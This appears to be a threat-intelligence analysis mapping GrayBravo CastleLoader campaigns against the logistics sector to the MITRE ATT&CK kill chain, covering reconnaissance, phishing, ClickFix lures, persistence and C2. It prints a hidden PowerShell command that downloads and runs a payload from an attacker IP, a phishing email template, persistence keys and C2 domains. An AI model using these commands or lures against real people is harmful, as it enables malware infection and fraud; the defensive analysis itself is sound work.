# Kill Chain Analysis

This document provides detailed analysis of GrayBravo-associated attack chains across all four identified activity clusters, mapped to the MITRE ATT&CK framework and Lockheed Martin Cyber Kill Chain.

## Overview of Attack Chains

| Cluster | Primary Kill Chain | Unique Elements | Duration |
|---------|-------------------|-----------------|----------|
| TAG-160 | Spearphishing → ClickFix → CastleLoader → RAT/Stealer | Freight platform abuse, domain re-registration | Minutes to hours |
| TAG-161 | Mass Phishing → ClickFix → CastleLoader/Matanbuchus | Custom phishing infrastructure, BEARHOST hosting | Minutes to hours |
| Cluster 3 | Phishing → ClickFix → CastleLoader → CastleRAT | Steam Community dead drop C2 resolution | Minutes to hours |
| Cluster 4 | Malvertising → Fake Download → CastleLoader → NetSupport | EV-signed MSI, GitHub distribution | Minutes |

## TAG-160: Logistics Sector Kill Chain

TAG-160 represents one of the most sophisticated and targeted campaigns in the GrayBravo ecosystem, demonstrating deep understanding of logistics industry operations and communications patterns. The attack chain leverages industry-specific social engineering combined with technical sophistication to compromise victims in the transportation sector.

### Phase 1: Reconnaissance (T1589, T1594)

The reconnaissance phase for TAG-160 operations demonstrates significant planning and research investment uncommon in typical cybercriminal campaigns. Threat actors conduct extensive intelligence gathering on target organizations and the logistics sector broadly to inform social engineering and infrastructure setup.

**Activities:**
- Target identification via freight-matching platforms (DAT Freight & Analytics, Loadlink Technologies)
- Research of legitimate logistics companies for impersonation (England Logistics, CDL Freight Logistics)
- Email address harvesting from public business directories and company websites
- Load posting analysis to understand current market rates and terminology
- Review of typical logistics communications for language and format

**Tools & Techniques:**
- DAT Freight & Analytics platform (fraudulent accounts for reconnaissance)
- Loadlink Technologies platform (fraudulent profiles)
- LinkedIn reconnaissance of logistics company employees
- Business directory mining (Manta, ZoomInfo)
- Industry forum monitoring (current_hot_loads Telegram channel)

**Indicators:**
- Suspicious freight platform account creation with recently registered domains
- Profile views from unknown or competitor accounts
- Unusual platform queries for company contact information
- Short-lived accounts that don't post or respond to loads

### Phase 2: Weaponization (T1608.001)

During weaponization, threat actors prepare the complete attack infrastructure including malicious payloads, phishing domains, and delivery mechanisms. This phase demonstrates technical sophistication and operational planning.

**Activities:**
- CastleLoader payload compilation and testing against AV/EDR solutions
- ClickFix social engineering package creation with realistic logistics themes
- Phishing email template development using authentic logistics terminology
- Domain registration targeting logistics sector (loads, freight, tracking keywords)
- Re-registration of expired logistics company domains for legitimacy
- PowerShell delivery script creation with evasion techniques

**Artifacts Created:**
- Logistics-themed domains: loadstracking.com, rateconfirmations.com, loadsschedule.com
- PowerShell download and execution scripts with obfuscation
- ZIP archives containing Python interpreter and malware scripts
- Decoy message templates mimicking DocuSign verification
- Fake DPE (Direct Port Entry) form landing pages

**Infrastructure Setup:**
- Domain registrar accounts (some compromised from previous operations)
- Web hosting provisioning for phishing landing pages
- Email delivery infrastructure (SMTP servers, SPF/DKIM configuration for spoofing)
- File hosting for payload delivery (direct IP hosting to evade domain blocks)

### Phase 3: Delivery (T1566.002)

Delivery represents the initial contact phase where phishing emails reach target victims. TAG-160 employs both spoofing of legitimate addresses and use of typosquatted domains to enhance perceived legitimacy.

**Delivery Methods:**
1. **Email Spoofing:** Forging sender addresses of legitimate logistics companies
2. **Typosquatted Domains:** Using domains similar to legitimate companies (englandloglstics.com)
3. **Re-registered Domains:** Using previously legitimate company domains now under attacker control

**Typical Email Structure:**
```
From: no-reply@englandlogistics.com [SPOOFED]
      OR david@cdlfreightlogistics.com [RE-REGISTERED DOMAIN]
To: carrier@victimcompany.com
Subject: Rate Confirmation - Load #ABC12345 - Urgent Response Required

Body:
Please review the attached rate confirmation for load #ABC12345 scheduled 
for pickup on [date]. This confirmation is time-sensitive and will expire 
in 24 hours.

Click here to view your rate confirmation:
https://apps.englandlogistics.rateconfirmations.com/confirm/xyz789

If the link does not open automatically, copy and paste it into your browser.

Thank you,
England Logistics Dispatch Team
```

**Social Engineering Elements:**
- **Urgency:** Time-limited offers creating pressure to act quickly
- **Authority:** Impersonation of known logistics companies
- **Legitimacy:** Use of industry-specific terminology and realistic scenarios
- **Scarcity:** "Expires in 24 hours" messaging
- **Rapport Building:** Initial emails without malicious content to establish trust

**Two-Stage Email Approach:**
Many campaigns begin with benign contact establishing rapport before delivering malicious links in follow-up messages. Initial email might confirm capacity for a load without links, then follow-up contains "rate confirmation" with malicious URL.

### Phase 4: Exploitation (T1204.002)

Exploitation occurs when the victim interacts with phishing content, leading them through a series of steps culminating in malware execution. The ClickFix technique is central to this phase.

**User Journey:**
1. Victim clicks email link
2. Redirected to logistics-themed landing page (DPE form or rate confirmation)
3. Form requests basic information (company name, email, phone) for credibility
4. After submission, ClickFix instructions displayed with DocuSign branding
5. Instructions guide user to press Windows+R and paste PowerShell command
6. Command executes in background while displaying decoy success message

**ClickFix Instruction Example:**
```
To complete document verification:

1. Press Windows+R on your keyboard
2. Copy the code below
3. Paste into the window that appears
4. Press OK

[Text box with PowerShell command]

This security verification is required to view sensitive shipment documents.
```

**PowerShell Command Pattern:**
```powershell
powershell -WindowStyle Hidden -Command "
    $url='http://89.185.84.211/payload.zip';
    $out='$env:TEMP\update.zip';
    iwr -Uri $url -OutFile $out;
    Expand-Archive -Path $out -DestinationPath $env:TEMP -Force;
    Start-Process -FilePath '$env:TEMP\pythonw.exe' -ArgumentList '$env:TEMP\loader.pyw' -WindowStyle Hidden;
    msg * 'Document verification complete. You may now close this window.'
"
```

### Phase 5: Installation (T1059.001, T1105)

Following successful exploitation, the PowerShell command downloads and executes CastleLoader, which then establishes persistence and prepares for second-stage payload deployment.

**Installation Sequence:**
1. ZIP archive downloads from attacker IP (bypassing domain-based blocking)
2. Archive extracts to %TEMP% containing:
   - pythonw.exe (legitimate Python interpreter, portable)
   - loader.pyw (CastleLoader Python script)
   - Required DLLs and dependencies
3. pythonw.exe executes loader.pyw with hidden window
4. CastleLoader performs environment checks (VM detection, sandbox detection)
5. If checks pass, malware proceeds to C2 communication
6. Persistence mechanisms established

**Persistence Mechanisms:**
```
Registry Run Key:
HKCU\Software\Microsoft\Windows\CurrentVersion\Run\WindowsUpdate
Value: "C:\Users\[user]\AppData\Local\Temp\pythonw.exe C:\Users\[user]\AppData\Local\Temp\loader.pyw"

Scheduled Task:
Task Name: Windows Security Update
Trigger: At log on
Action: Execute pythonw.exe with loader script
```

**Files Created on Disk:**
- `%TEMP%\update.zip` (deleted after extraction)
- `%TEMP%\pythonw.exe` (legitimate Python interpreter)
- `%TEMP%\loader.pyw` (CastleLoader script)
- `%TEMP%\python3.dll` and supporting libraries
- Potential additional staging scripts

### Phase 6: Command and Control (T1071.001, T1573)

Once installed, CastleLoader establishes communication with command-and-control infrastructure to receive configuration and download second-stage payloads.

**C2 Communication Pattern:**
```http
GET /service/settings/a1b2c3d4e5f6 HTTP/1.1
Host: wereatwar.com
Cache-Control: no-cache
Connection: Keep-Alive
Pragma: no-cache
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)
```

**Key Characteristics:**
- No Accept header (distinguishes from legitimate browsers)
- Consistent header pattern across infections
- URI pattern: /service/settings/[hash]
- HTTP or HTTPS (varies by campaign)

**C2 Infrastructure:**
- **Primary Domains:** wereatwar.com, oldspicenotsogood.shop, castlppwnd.com
- **Backup Domains:** donttouchme.life, icantseeyou.icu
- **Beaconing Frequency:** Every 60-300 seconds (varies)
- **Redundancy:** Multiple C2 servers with shared configuration

**Configuration Retrieval:**
CastleLoader receives instructions including:
- Which second-stage payload to download
- C2 servers for follow-on malware
- Anti-analysis evasion updates
- Campaign-specific parameters
